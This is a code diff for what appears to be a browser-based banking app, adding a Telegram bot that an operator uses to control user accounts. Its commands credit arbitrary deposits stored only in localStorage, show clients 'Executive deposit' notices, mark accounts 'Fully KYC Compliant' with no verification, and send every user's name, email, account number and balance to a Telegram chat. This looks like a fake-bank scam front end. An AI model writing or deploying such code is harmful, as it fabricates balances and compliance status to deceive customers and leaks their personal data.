+        const uIdx = ADM_USERS.findIndex(x => x.id === targetUser.id);
+        if(uIdx >= 0) ADM_USERS[uIdx] = targetUser;
+        localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
+        
+        const depositTx = {
+          userId: targetUser.id,
+          n: "Institutional Credit (Telegram Wire)",
+          d: "Today · " + new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}),
+          a: amt,
+          type: "in",
+          cat: "wire"
+        };
+        let allTxs = JSON.parse(localStorage.getItem('mcb_txs')) || [];
+        allTxs.unshift(depositTx);
+        localStorage.setItem('mcb_txs', JSON.stringify(allTxs));
+        
+        const currentUserId = (window.Clerk && window.Clerk.user) ? window.Clerk.user.id : 'u1';
+        if(currentUserId === targetUser.id){
+          BALANCE = targetUser.balance;
+          txData.unshift(depositTx);
+          updateBalanceUI();
+          renderTx();
+          toast(`⚡ Executive deposit of ${fmtBal(amt)} credited by Admin`);
+        }
+        if(typeof renderAdmin === 'function') renderAdmin();
+        
+        await sendTgDirect(chatId, `✅ <b>DEPOSIT CONFIRMED</b>\n\n<b>Beneficiary:</b> ${targetUser.name}\n<b>Account Number:</b> <code>${targetUser.accountNumber || 'N/A'}</code>\n<b>Amount Credited:</b> $${amt.toLocaleString()}\n<b>New Total Balance:</b> $${targetUser.balance.toLocaleString()}\n<b>Processed By:</b> ${sender}`);
+      }
+      else if(text.startsWith('/approve')){
+        const parts = text.split(/\s+/);
+        if(parts.length < 2){
+          await sendTgDirect(chatId, `⚠️ <b>Usage:</b> <code>/approve &lt;account_or_email&gt; [tier]</code>\nExample: <code>/approve 4829104820 private</code>`);
+          continue;
+        }
+        const identifier = parts[1].toLowerCase();
+        const customTier = parts[2] ? parts[2].toLowerCase() : null;
+        
+        let storedUsers = JSON.parse(localStorage.getItem('mcb_users') || '[]');
+        let targetUser = storedUsers.find(x => 
+          (x.accountNumber && x.accountNumber.toLowerCase() === identifier) ||
+          (x.email && x.email.toLowerCase() === identifier) ||
+          (x.name && x.name.toLowerCase().includes(identifier))
+        ) || ADM_USERS.find(x => 
+          (x.accountNumber && x.accountNumber.toLowerCase() === identifier) ||
+          (x.email && x.email.toLowerCase() === identifier) ||
+          (x.name && x.name.toLowerCase().includes(identifier))
+        );
+        
+        if(!targetUser){
+          await sendTgDirect(chatId, `❌ <b>Client Not Found:</b> No registered account matching "<code>${parts[1]}</code>".`);
+          continue;
+        }
+        
+        const finalTier = customTier || targetUser.target || 'premium';
+        targetUser.tier = finalTier;
+        targetUser.kyc = 'verified';
+        delete targetUser.target;
+        
+        ADM_USERS = storedUsers;
+        const uIdx = ADM_USERS.findIndex(x => x.id === targetUser.id);
+        if(uIdx >= 0) ADM_USERS[uIdx] = targetUser;
+        localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
+        
+        const currentUserId = (window.Clerk && window.Clerk.user) ? window.Clerk.user.id : 'u1';
+        if(currentUserId === targetUser.id){
+          state.tier = finalTier;
+          updateBalanceUI();
+          updateLimitUI();
+          toast(`👑 Your account tier has been approved as ${finalTier.toUpperCase()}!`);
+        }
+        if(typeof renderAdmin === 'function') renderAdmin();
+        
+        await sendTgDirect(chatId, `👑 <b>TIER UPGRADE APPROVED</b>\n\n<b>Client:</b> ${targetUser.name}\n<b>Account:</b> <code>${targetUser.accountNumber}</code>\n<b>Verified Tier:</b> ${finalTier.toUpperCase()}\n<b>Status:</b> Fully KYC Compliant`);
+      }
+      else if(text.startsWith('/users')){
+        let storedUsers = JSON.parse(localStorage.getItem('mcb_users') || '[]');
+        if(!storedUsers.length) storedUsers = ADM_USERS;
+        let reply = `👥 <b>REGISTERED CLIENTS (${storedUsers.length})</b>\n\n`;
+        storedUsers.forEach((u, i) => {
+          reply += `<b>${i+1}. ${u.name}</b>\n• Acct: <code>${u.accountNumber || '—'}</code>\n• Email: <code>${u.email}</code>\n• Balance: <b>$${(u.balance||0).toLocaleString()}</b>\n• Tier: <b>${(u.tier||'basic').toUpperCase()}</b> (KYC: ${u.kyc||'verified'})\n\n`;
+        });
+        await sendTgDirect(chatId, reply);
+      }
+      else if(text.startsWith('/status')){
+        let storedUsers = JSON.parse(localStorage.getItem('mcb_users') || '[]');
+        if(!storedUsers.length) storedUsers = ADM_USERS;
+        const totalBal = storedUsers.reduce((sum, u) => sum + (u.balance || 0), 0);
+        const pendingKyc = storedUsers.filter(u => u.kyc === 'pending').length;
+        const statusMsg = `📊 <b>INSTITUTIONAL METRICS</b>\n\n<b>Total Clients:</b> ${storedUsers.length}\n<b>Total Custody Balance:</b> $${totalBal.toLocaleString()}\n<b>Pending Tier Upgrades:</b> ${pendingKyc}\n<b>Bot Status:</b> 🟢 Active Online`;
+        await sendTgDirect(chatId, statusMsg);
+      }
+    }
+  } catch(err){
+    console.warn('checkTelegramCommands error:', err);
+  }
+}
+
+// Start Telegram Polling
+checkTelegramCommands();
+setInterval(checkTelegramCommands, 3500);
 
 updateBalanceUI();
 renderNav();renderTx();
